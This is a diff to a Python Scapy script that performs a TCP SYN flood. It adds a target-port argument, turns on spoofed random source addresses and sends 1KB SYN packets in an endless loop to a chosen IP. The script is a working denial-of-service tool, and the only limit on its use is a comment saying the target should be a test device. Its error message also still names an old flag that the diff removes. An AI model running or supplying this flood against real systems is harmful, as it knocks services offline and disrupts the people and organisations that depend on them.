@@ -3,29 +3,34 @@ from argparse import ArgumentParser
 
 
 def main():
+    
+    # Specify the command line Arguments
     parser = ArgumentParser()
-    parser.add_argument('--target-ip', '-tg', help='Target IP address')
-    parser.epilog = "Usage: py SYN.py -tg 10.20.30.40"        
+    parser.add_argument('--target-ip', '-t', help='Target IP address')
+    parser.add_argument('--target-port', '-p', help='Target Port')
+    parser.epilog = "Usage: python syn_flooding.py -t <IP Address>"        
     args = parser.parse_args()
+    
+    # Checks if argument is not empty
+
     if args.target_ip is not None:
-        # target IP address (should be a testing router/firewall)
-        target_ip = args.target_ip
-        # the target port u want to flood
-        target_port = 80
-        # forge IP packet with target ip as the destination IP address
-        ip = IP(dst=target_ip)
-        # or if you want to perform IP Spoofing (will work as well)
-        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
-        # forge a TCP SYN packet with a random source port
-        # and the target port as the destination port
-        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
-        # add some flooding data (1KB in this case, don't increase it too much,
-        # otherwise, it won't work.)
-        raw = Raw(b"X"*1024)
-        # stack up the layers
-        p = ip / tcp / raw
-        # send the constructed packet in a loop until CTRL+C is detected
-        send(p, loop=1, verbose=0)
+        
+        target_ip = args.target_ip # target IP address (should be a testing router/firewall)
+        
+        target_port = args.target_port # the target port u want to flood
+        
+        ip = IP(src=RandIP("172.0.0.1/24"), dst=target_ip) # forge IP packet with source IP Spoofing and target ip as the destination IP address
+        
+        tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # random source port, use TCP SYN packet.
+        
+        raw = Raw(b"X"*1024) # add some flooding data (1KB in this case, don't increase it too much, # otherwise, it won't work.)
+        
+        p = ip / tcp / raw # stack up the layers
+        
+        print("The SYN Flood has commence, do CTRL+C to cancel / exit")
+        
+        send(p, loop=1, verbose=0) # send the constructed packet in a loop until CTRL+C is detected
+        
     else:
         print('[-]Please, use --target-ip or -tg to set a Target IP Address!')
         print('[!]Example: -tg 10.20.30.40')
